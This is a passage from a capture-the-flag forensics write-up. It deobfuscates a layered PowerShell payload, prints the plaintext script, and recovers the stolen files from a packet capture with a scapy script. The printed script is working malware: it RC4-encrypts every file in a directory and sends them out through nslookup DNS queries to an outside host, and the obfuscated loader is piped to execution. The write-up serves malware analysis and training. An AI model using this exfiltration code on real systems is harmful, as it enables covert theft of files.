${)}${~}${]}  +  ${)}${@$/}${@$/}+${)}${]}${~=}  +  ${)}${~}${]}  +  ${)}${~=}${;+}${'$[}  +${)}${![/}${$] }  +${)}${![/}${;+}+  ${)}${~}${]}+  ${)}${~=}${~=}${;+}+  ${)}${![/}${@[}+${)}${~}${]}  +  ${)}${@$/}${'$[}  +  ${)}${![/}${~=}+${)}${~}${@[}+${)}${~=}${@[}${$] }  +  ${)}${$] }${@$/}  +${)}${~}${@[}  +${)}${~}${]}+  ${)}${~=}${~=}${![/}  +${)}${![/}${~}+${)}${]}${~=}+  ${)}${~}${]}+  ${)}${~=}${;+}${~=}  +  ${)}${![/}${]}  +${)}${'$[}${~}+${)}${~=}${~=}${](}  +  ${)}${@$/}${'$[}  +  ${)}${~=}${~=}${$] }+${)}${~=}${~=}${]}  +  ${)}${~=}${~=}${![/}  +${)}${~=}${;+}${$] }+${)}${~=}${~=}${;+}+  ${)}${~=}${;+}${~}  +${)}${![/}${;+}+${)}${~}${]}  +${)}${~=}${~=}${;+}+${)}${![/}${@[}+  ${)}${~}${]}  +${)}${@$/}${'$[}  +  ${)}${![/}${![/}+  ${)}${~}${@[}+  ${)}${~}${]}+  ${)}${@$/}${@$/}  +${)}${![/}${~=}  +${)}${~}${@[}+${)}${![/}${~}+${)}${~}${@[}  +  ${)}${~}${![/}+  ${)}${![/}${]}  +  ${)}${~}${![/}+${)}${$] }${@$/}+  ${)}${~}${@[}+${)}${~=}${;+}${$] }+${)}${~=}${;+}${@[}  +${)}${~}${@[}+${)}${![/}${;+}+  ${)}${![/}${;+}  +  ${)}${~}${]}+  ${)}${~=}${~=}${;+}  +  ${)}${~}${](}+  ${)}${~}${]}  +  ${)}${~=}${~=}${$] }  +  ${)}${![/}${~=}  +  ${)}${~}${@[}+  ${)}${![/}${$] }  +  ${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${~}  +${)}${~}${@[}+${)}${![/}${;+}+${)}${~}${]}+  ${)}${~=}${~=}${$] }+${)}${![/}${$] }  +${)}${![/}${@$/}+  ${)}${![/}${~=}  +  ${)}${![/}${~=}+${)}${~}${@[}  +  ${)}${~=}${@[}${~}+  ${)}${~}${@[}+${)}${~=}${~=}${;+}+${)}${~=}${~=}${$] }+  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${~=}${~=}  +${)}${~=}${~=}${~=}+${)}${~=}${;+}${](}+${)}${~=}${~=}${](}  +${)}${~=}${~=}${@[}+${)}${~}${@[}  +${)}${![/}${$] }+  ${)}${~=}${~=}${]}+  ${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${@[}  +  ${)}${~=}${;+}${~=}+  ${)}${]}${~=}+${)}${]}${$] }  +  ${)}${~}${@[}  +  ${)}${~}${]}+${)}${~=}${~=}${![/}  +${)}${~}${]}  +${)}${@$/}${](}  +  ${)}${![/}${]}+  ${)}${~}${@[}  +  ${)}${~}${]}+${)}${~=}${;+}${;+}  +  ${)}${$] }${@$/}  +${)}${~}${@[}+  ${)}${~}${]}  +${)}${~=}${~=}${![/}+  ${)}${]}${~=}+${)}${~}${![/}  +${)}${~}${![/}  +${)}${~}${@[}+  ${)}${~=}${@[}${$] }+${)}${~}${@[}  +${)}${~}${]}  +${)}${~=}${~=}${;+}  +${)}${]}${~=}+  ${)}${~}${]}+${)}${~=}${~=}${;+}  +${)}${![/}${~}  +  ${)}${![/}${@$/}+${)}${~}${@[}+${)}${~=}${@[}${$] }  +  ${)}${~}${@[}  +  ${)}${~=}${~=}${;+}+${)}${~=}${~=}${$] }  +  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${~=}${~=}+${)}${~=}${~=}${~=}+${)}${~=}${;+}${](}  +  ${)}${~=}${~=}${](}+  ${)}${~=}${~=}${@[}  +${)}${~}${@[}+  ${)}${![/}${$] }+${)}${~=}${~=}${]}  +  ${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${@[}+  ${)}${~=}${;+}${~=}  +  ${)}${]}${~=}+  ${)}${]}${$] }+${)}${~}${@[}+  ${)}${~}${]}  +  ${)}${~=}${~=}${![/}+  ${)}${~}${]}  +${)}${@$/}${](}  +${)}${![/}${]}  +  ${)}${~}${@[}  +  ${)}${~}${]}  +${)}${~=}${;+}${;+}  +${)}${~}${@[}+  ${)}${~=}${@[}${$] }  |  ${;@!}  "  |&  ${;@!}    
```

We can see a pip `|&  ${;@!}` at the end, which is likely to indicate execution. Removing it and running the command (always in a VM), we get a another layer of obfuscation, more readable this time:  
```powershell
[CHar]36+[CHar]100+[CHar]61  +[CHar]34  +[CHar]49  +[CHar]55+  [CHar]50  +[CHar]46+[CHar]50+  [CHar]49  +[CHar]46+[CHar]50  +  [CHar]48+[CHar]46+[CHar]57+[CHar]54 
 +[CHar]34  +[CHar]59  +[CHar]32+  [CHar]36+[CHar]115  +  [CHar]61+  [CHar]52  +  [CHar]59+  [CHar]32  +  [CHar]36+[CHar]98  +[CHar]61+  [CHar]53  +  [CHar]55  +  
[CHar]59  +[CHar]32  +[CHar]71+  [CHar]101+  [CHar]116  +[CHar]45  +[CHar]67+  [CHar]104+[CHar]105+  [CHar]108  +[CHar]100  +[CHar]73  +  [CHar]116+[CHar]101+[CHar
]109+  [CHar]32  +  [CHar]34  +[CHar]46  +[CHar]34+  [CHar]32+  [CHar]124+  [CHar]32  +[CHar]70+  [CHar]111+[CHar]114+[CHar]101  +[CHar]97+[CHar]99+[CHar]104+[CHar
]45+  [CHar]79+[CHar]98  +[CHar]106+  [CHar]101  +[CHar]99  +  [CHar]116+  [CHar]32  +[CHar]123  +  [CHar]36  +  [CHar]97+[CHar]61+  [CHar]91  +  [CHar]83  +  [CHa
r]121+[CHar]115  +  [CHar]116+[CHar]101+  [CHar]109  +  [CHar]46+[CHar]67+  [CHar]111+  [CHar]110+  [CHar]118+  [CHar]101+  [CHar]114+[CHar]116  +[CHar]93  +[CHar]
58+  [CHar]58+  [CHar]84+[CHar]111+  [CHar]66+[CHar]97  +[CHar]115+  [CHar]101+[CHar]54  +  [CHar]52+[CHar]83  +[CHar]116  +  [CHar]114+  [CHar]105+[CHar]110+  [CH
ar]103+  [CHar]40+  [CHar]36+[CHar]69  +[CHar]110+  [CHar]99  +  [CHar]46+[CHar]71  +[CHar]101  +  [CHar]116  +  [CHar]66+  [CHar]121+[CHar]116+[CHar]101  +[CHar]1
15+[CHar]40  +[CHar]36  +  [CHar]95  +  [CHar]46+  [CHar]78+  [CHar]97  +[CHar]109  +[CHar]101+[CHar]41+  [CHar]41  +[CHar]59+  [CHar]32  +[CHar]36+[CHar]82+[CHar]
61  +  [CHar]123+[CHar]36  +[CHar]68  +  [CHar]44  +[CHar]36  +  [CHar]75  +[CHar]61  +[CHar]36+[CHar]65+[CHar]114  +  [CHar]103  +[CHar]115+[CHar]59  +[CHar]36+  
[CHar]83+[CHar]61+  [CHar]48+[CHar]46+  [CHar]46  +  [CHar]50  +  [CHar]53  +[CHar]53  +[CHar]59  +  [CHar]48  +[CHar]46+[CHar]46  +  [CHar]50+  [CHar]53+  [CHar]5
3  +[CHar]124  +[CHar]37+[CHar]123  +[CHar]36  +  [CHar]74  +[CHar]61  +[CHar]40+[CHar]36+[CHar]74+[CHar]43  +  [CHar]36  +  [CHar]83+  [CHar]91+  [CHar]36+[CHar]9
5+[CHar]93+  [CHar]43  +  [CHar]36  +  [CHar]75  +[CHar]91  +[CHar]36  +[CHar]95+  [CHar]37  +[CHar]36  +  [CHar]75  +  [CHar]46+[CHar]76  +[CHar]101+[CHar]110  + 
 [CHar]103+  [CHar]116  +[CHar]104  +[CHar]93+[CHar]41+  [CHar]37+[CHar]50+[CHar]53+[CHar]54  +  [CHar]59  +  [CHar]36+[CHar]83+  [CHar]91+  [CHar]36  +  [CHar]95 
 +[CHar]93  +  [CHar]44  +  [CHar]36  +[CHar]83+[CHar]91  +[CHar]36+  [CHar]74+  [CHar]93  +[CHar]61+[CHar]36+  [CHar]83+[CHar]91+[CHar]36  +  [CHar]74  +[CHar]93+
  [CHar]44  +  [CHar]36  +  [CHar]83  +[CHar]91  +[CHar]36  +[CHar]95  +  [CHar]93  +[CHar]125+[CHar]59  +  [CHar]36+  [CHar]68+  [CHar]124+[CHar]37  +  [CHar]123 
 +[CHar]36  +[CHar]73+[CHar]61  +[CHar]40+  [CHar]36+  [CHar]73  +  [CHar]43+  [CHar]49+  [CHar]41  +  [CHar]37  +[CHar]50  +[CHar]53+[CHar]54+  [CHar]59+  [CHar]3
6+  [CHar]72  +[CHar]61+[CHar]40+  [CHar]36  +[CHar]72+  [CHar]43  +[CHar]36+[CHar]83+  [CHar]91  +  [CHar]36+[CHar]73+[CHar]93+[CHar]41  +  [CHar]37  +[CHar]50+  
[CHar]53  +  [CHar]54  +[CHar]59+[CHar]36  +[CHar]83+[CHar]91+  [CHar]36  +[CHar]73+[CHar]93+[CHar]44+  [CHar]36+  [CHar]83+  [CHar]91+  [CHar]36+  [CHar]72  +[CHa
r]93  +  [CHar]61  +[CHar]36+[CHar]83+  [CHar]91  +  [CHar]36+[CHar]72+[CHar]93+  [CHar]44  +  [CHar]36+  [CHar]83  +[CHar]91+  [CHar]36  +  [CHar]73+[CHar]93  +  
[CHar]59  +  [CHar]36  +  [CHar]95  +[CHar]45+  [CHar]98+[CHar]120+  [CHar]111  +  [CHar]114+  [CHar]36+  [CHar]83+[CHar]91+  [CHar]40+  [CHar]36+[CHar]83+[CHar]91
+  [CHar]36+  [CHar]73  +[CHar]93  +[CHar]43  +  [CHar]36+  [CHar]83  +[CHar]91+[CHar]36  +[CHar]72+[CHar]93  +  [CHar]41+  [CHar]37  +  [CHar]50+  [CHar]53  +  [C
Har]54  +[CHar]93+  [CHar]125+  [CHar]125+  [CHar]59+  [CHar]32  +[CHar]36  +  [CHar]69  +[CHar]110  +  [CHar]99+  [CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]91+[C
Har]83  +[CHar]121  +  [CHar]115+  [CHar]116  +  [CHar]101  +[CHar]109+  [CHar]46+[CHar]84+[CHar]101+[CHar]120  +  [CHar]116  +[CHar]46  +  [CHar]69  +  [CHar]110 
 +  [CHar]99+[CHar]111  +[CHar]100  +  [CHar]105+  [CHar]110  +[CHar]103+  [CHar]93+[CHar]58+[CHar]58+  [CHar]65  +  [CHar]83+  [CHar]67+[CHar]73+  [CHar]73  +  [C
Har]59  +[CHar]32+[CHar]36  +[CHar]112+[CHar]32+  [CHar]61  +[CHar]32+  [CHar]36+  [CHar]69+  [CHar]110+  [CHar]99+  [CHar]46  +[CHar]71  +[CHar]101  +[CHar]116  +
[CHar]66+  [CHar]121+[CHar]116+[CHar]101  +  [CHar]115+[CHar]40  +[CHar]39+[CHar]91+  [CHar]83  +  [CHar]121  +[CHar]115  +  [CHar]116  +  [CHar]101  +[CHar]109+  
[CHar]46  +  [CHar]73+[CHar]79+  [CHar]46+  [CHar]70+[CHar]105+  [CHar]108+  [CHar]101  +[CHar]93  +  [CHar]58+  [CHar]58+  [CHar]82+  [CHar]101  +  [CHar]97  +[CH
ar]100+  [CHar]65+  [CHar]108  +  [CHar]108+[CHar]66  +[CHar]121+[CHar]116  +  [CHar]101  +  [CHar]115  +  [CHar]40  +  [CHar]36  +[CHar]95+[CHar]46  +[CHar]70+[CH
ar]117+[CHar]108+[CHar]108+[CHar]78  +  [CHar]97  +  [CHar]109  +  [CHar]101+  [CHar]41  +[CHar]39  +  [CHar]41  +  [CHar]59+[CHar]32  +  [CHar]36  +[CHar]122  +[C
Har]32+  [CHar]61  +[CHar]32  +  [CHar]36+  [CHar]69+  [CHar]110+  [CHar]99  +[CHar]46  +[CHar]71  +[CHar]101  +  [CHar]116  +[CHar]66  +  [CHar]121  +[CHar]116+  
[CHar]101  +[CHar]115  +[CHar]40+[CHar]91+  [CHar]83  +  [CHar]121+  [CHar]115+  [CHar]116  +[CHar]101+[CHar]109+  [CHar]46  +  [CHar]73+[CHar]79+  [CHar]46  +[CHa
r]70  +[CHar]105  +  [CHar]108+[CHar]101  +  [CHar]93+  [CHar]58+[CHar]58  +[CHar]82  +  [CHar]101  +[CHar]97+  [CHar]100  +[CHar]65  +[CHar]108  +  [CHar]108  +[C
Har]66+[CHar]121+  [CHar]116  +[CHar]101  +[CHar]115+  [CHar]40+[CHar]36  +  [CHar]95  +  [CHar]46  +  [CHar]70  +[CHar]117  +[CHar]108+  [CHar]108  +  [CHar]78+[C
Har]97+[CHar]109  +  [CHar]101  +[CHar]41+[CHar]41  +  [CHar]59  +[CHar]32  +[CHar]36  +[CHar]117  +[CHar]32+[CHar]61  +[CHar]32  +  [CHar]40+  [CHar]38  +  [CHar]
32+[CHar]36+[CHar]82+[CHar]32  +[CHar]36  +[CHar]122  +[CHar]32+  [CHar]36+[CHar]112  +  [CHar]41+  [CHar]59+[CHar]32+  [CHar]36+[CHar]101  +  [CHar]32  +[CHar]61+
[CHar]32+[CHar]91+  [CHar]83  +[CHar]121  +  [CHar]115+[CHar]116+  [CHar]101+[CHar]109  +[CHar]46  +[CHar]67  +[CHar]111  +[CHar]110+[CHar]118  +  [CHar]101+[CHar]
114  +  [CHar]116  +  [CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]66+[CHar]97  +  [CHar]115  +[CHar]101  +[CHar]54+[CHar]52  +[CHar]83+  [CHar]11
6  +[CHar]114  +[CHar]105  +[CHar]110  +  [CHar]103+  [CHar]40  +  [CHar]36+[CHar]117  +  [CHar]41  +[CHar]59  +  [CHar]32  +  [CHar]36+  [CHar]108  +  [CHar]61+  
[CHar]36+  [CHar]101+  [CHar]46+  [CHar]76  +[CHar]101+[CHar]110+[CHar]103+  [CHar]116+[CHar]104  +  [CHar]59  +  [CHar]32+[CHar]36+  [CHar]114  +[CHar]61+  [CHar]
34  +[CHar]34  +[CHar]59  +  [CHar]32  +[CHar]36+  [CHar]110+[CHar]61+  [CHar]48  +  [CHar]59  +  [CHar]32  +  [CHar]119+[CHar]104+[CHar]105+  [CHar]108  +  [CHar]
101+[CHar]32  +[CHar]40  +  [CHar]36+[CHar]110+  [CHar]32  +  [CHar]45+[CHar]108  +[CHar]101  +  [CHar]32+[CHar]40+  [CHar]36  +  [CHar]108+[CHar]47  +[CHar]36  + 
 [CHar]98+[CHar]41  +  [CHar]41  +[CHar]32+[CHar]123  +[CHar]32  +[CHar]36  +  [CHar]99  +  [CHar]61  +  [CHar]36  +[CHar]98  +  [CHar]59+[CHar]32  +[CHar]105  +  
[CHar]102  +[CHar]32+[CHar]40  +[CHar]40  +  [CHar]36+  [CHar]110+  [CHar]42  +  [CHar]36  +[CHar]98+[CHar]41  +[CHar]43+[CHar]36  +  [CHar]99  +[CHar]32  +[CHar]4
5  +[CHar]103+[CHar]116  +  [CHar]32+  [CHar]36+[CHar]108  +[CHar]41+[CHar]32  +  [CHar]123+[CHar]32+  [CHar]36  +  [CHar]99+[CHar]61  +  [CHar]36  +  [CHar]108  +
[CHar]45  +[CHar]40+  [CHar]36+  [CHar]110+  [CHar]42+[CHar]36  +  [CHar]98  +  [CHar]41+[CHar]32+[CHar]125  +  [CHar]59  +[CHar]32  +[CHar]36+  [CHar]114  +[CHar]
43+[CHar]61+  [CHar]36+  [CHar]101  +  [CHar]46  +[CHar]83+[CHar]117  +  [CHar]98  +  [CHar]115+[CHar]116  +  [CHar]114  +[CHar]105+[CHar]110+  [CHar]103  +[CHar]4
0+[CHar]36  +[CHar]110+[CHar]42+  [CHar]36  +[CHar]98  +  [CHar]44+  [CHar]32+  [CHar]36+  [CHar]99  +[CHar]41  +[CHar]32+[CHar]43+[CHar]32  +  [CHar]34+  [CHar]46
  +  [CHar]34+[CHar]59+  [CHar]32+[CHar]105+[CHar]102  +[CHar]32+[CHar]40+  [CHar]40  +  [CHar]36+  [CHar]110  +  [CHar]37+  [CHar]36  +  [CHar]115  +  [CHar]41  +
  [CHar]32+  [CHar]45  +  [CHar]101  +  [CHar]113  +[CHar]32+[CHar]40+[CHar]36+  [CHar]115+[CHar]45  +[CHar]49+  [CHar]41  +  [CHar]41+[CHar]32  +  [CHar]123+  [CH
ar]32+[CHar]110+[CHar]115+  [CHar]108  +  [CHar]111  +[CHar]111+[CHar]107+[CHar]117  +[CHar]112+[CHar]32  +[CHar]45+  [CHar]116+  [CHar]121+  [CHar]112  +  [CHar]1
01+  [CHar]61+[CHar]65  +  [CHar]32  +  [CHar]36+[CHar]114  +[CHar]36  +[CHar]97  +  [CHar]46+  [CHar]32  +  [CHar]36+[CHar]100  +  [CHar]59  +[CHar]32+  [CHar]36 
 +[CHar]114+  [CHar]61+[CHar]34  +[CHar]34  +[CHar]32+  [CHar]125+[CHar]32  +[CHar]36  +[CHar]110  +[CHar]61+  [CHar]36+[CHar]110  +[CHar]43  +  [CHar]49+[CHar]32+
[CHar]125  +  [CHar]32  +  [CHar]110+[CHar]115  +  [CHar]108  +  [CHar]111+[CHar]111+[CHar]107  +  [CHar]117+  [CHar]112  +[CHar]32+  [CHar]45+[CHar]116  +  [CHar]
121+  [CHar]112+  [CHar]101  +  [CHar]61+  [CHar]65+[CHar]32+  [CHar]36  +  [CHar]114+  [CHar]36  +[CHar]97  +[CHar]46  +  [CHar]32  +  [CHar]36  +[CHar]100  +[CHa
r]32+  [CHar]125  |  iex
```

You could also utilize this SANS article to run the initial powershell as is and still get the deobfuscated code:  
- https://isc.sans.edu/diary/30636

Removing the `| iex` from the previous output and running the obfuscated layer in an online powershell interpreted, we finally get the plaintext script:  

![alt text](/posts/writeups/training/idek2022/plaintextPowershell.png)  

As a note, I had to put the whole code into notepad++ to remove the newline character that was triggering errors both in a powershell terminal and in the `tio.run` powershell online interpreter.  

The plaintext script is:  
```powershell
$d = "172.21.20.96";
$s = 4;
$b = 57;
Get - ChildItem "." | Foreach - Object {
    $a = [System.Convert]::ToBase64String($Enc.GetBytes($_.Name));
    $R = {
        $D,
        $K = $Args;$S = 0. .255;0. .255 | % {
            $J = ($J + $S[$_] + $K[$_ % $K.Length]) % 256;$S[$_],
            $S[$J] = $S[$J],
            $S[$_]
        };$D | % {
            $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],
            $S[$H] = $S[$H],
            $S[$I];$_ - bxor$S[($S[$I] + $S[$H]) % 256]
        }
    };
    $Enc = [System.Text.Encoding]::ASCII;
    $p = $Enc.GetBytes('[System.IO.File]::ReadAllBytes($_.FullName)');
    $z = $Enc.GetBytes([System.IO.File]::ReadAllBytes($_.FullName));
    $u = ( & $R $z $p);
    $e = [System.Convert]::ToBase64String($u);
    $l = $e.Length;
    $r = "";
    $n = 0;
    while ($n - le($l / $b)) {
        $c = $b;
        if (($n * $b) + $c - gt $l) {
            $c = $l - ($n * $b)
        };
        $r += $e.Substring($n * $b, $c) + ".";
        if (($n % $s) - eq($s - 1)) {
            nslookup - type = A $r$a.$d;
            $r = ""
        }
        $n = $n + 1
    }
    nslookup - type = A $r$a.$d
}
```
So what will end up being executed on the victim's machine is a `ps1` script that uses RC4 and b64 to exfiltrate data. The form of the exfiltrated data observed through Wireshark are of the following form:  
```
PgNq1d7oaEmhEIK7jWCvLaBLcry7VkwjF7pOETJxngBa4UZwo+edngabf.Z8ZZeOZotc/pI40.U2VjcmV0UGxhbi5wZGY=
```

Basically, the exfiltrated files are sent part by part, splitted by a `dot`, where the last part is the filename of the file that is being exfiltrated. In the example above, the file that is exfiltrated is:  
```python
>>> from base64 import b64decode
>>> b64decode(b"U2VjcmV0UGxhbi5wZGY=")
b'SecretPlan.pdf'
```

So to reconstruct a specific file, we need to gather all the base64 data related to the specified filename, decode them from base64 and decrypt from RC4 using the key found in the previously deobfuscated powershell code `[System.IO.File]::ReadAllBytes($_.FullName)`.  

To avoid doing this by hand, I wrote a python scapy script to do all of this automatically:  
```python
from scapy.all import *
from base64 import b64decode
from Crypto.Cipher import ARC4

def decrypt_RC4(ciphertext):
	cipher = ARC4.new(b'[System.IO.File]::ReadAllBytes($_.FullName)')
	decrypted = cipher.decrypt(ciphertext)

	return decrypted

pkts = rdpcap("./HiddenGem.pcapng")
packets = [p for p in pkts if IP in p and (p[IP].src == "172.21.20.96" or p[IP].dst == "172.21.20.96")]

exfiltrated_files = {}
for p in packets:
	if p.haslayer(DNS) and p[DNS].id == 0x0002 and p[DNS].qr == 0:
		exfiltrated = p[DNSQR].qname.decode()
		parts = exfiltrated.split(".")[:-1]
		

		filename = b64decode(parts[-1]).decode()
		if filename not in exfiltrated_files.keys():
			exfiltrated_files[filename] = b''

		exfiltrated_files[filename] += b64decode("".join(parts[:-1]))


for filename, filedata in exfiltrated_files.items():
    decrypted = decrypt_RC4(filedata)

    byte_values = [int(num) for num in decrypted.split()]
    byte_data = bytes(byte_values)

    with open(filename, "wb") as f:
        f.write(byte_data)

    print(f"Successfully reconstructed {filename}")

```

The script does the following:
- Inspects only packets related to the IP address `172.21.20.96` found in the ps1 script.
- Verifies that the packet has a `DNS` layer, its transaction id is of type `0x0002` and its query type is `0` (only requests, not responses). This makes sure we get only packets related to the exfiltrated files and avoid duplicates.
- Gets the data, splits based on dot, and stores the content based on the filename.
- Takes care of decrypting using RC4.
- Stores the data in the corresponding file.

After running the script, we get the reconstructed files:
```
└─$ python nslookup.py            
Successfully reconstructed des.txt
Successfully reconstructed KCSC.jpg
Successfully reconstructed readme.txt
Successfully reconstructed readme2.txt
Successfully reconstructed SecretPlan.pdf
Successfully reconstructed update.ps1
Successfully reconstructed vov.txt
Successfully reconstructed zoneblue.jpg
```

Trying them one by one, we get our flag inside the `SecretPlan.pdf`:  

![alt text](/posts/writeups/training/idek2022/flag.png)


That is it for this one. Overall an amazing challenge both for training and for learning. Once again, **thanks to bquanman** for letting me give a try to his challenge:)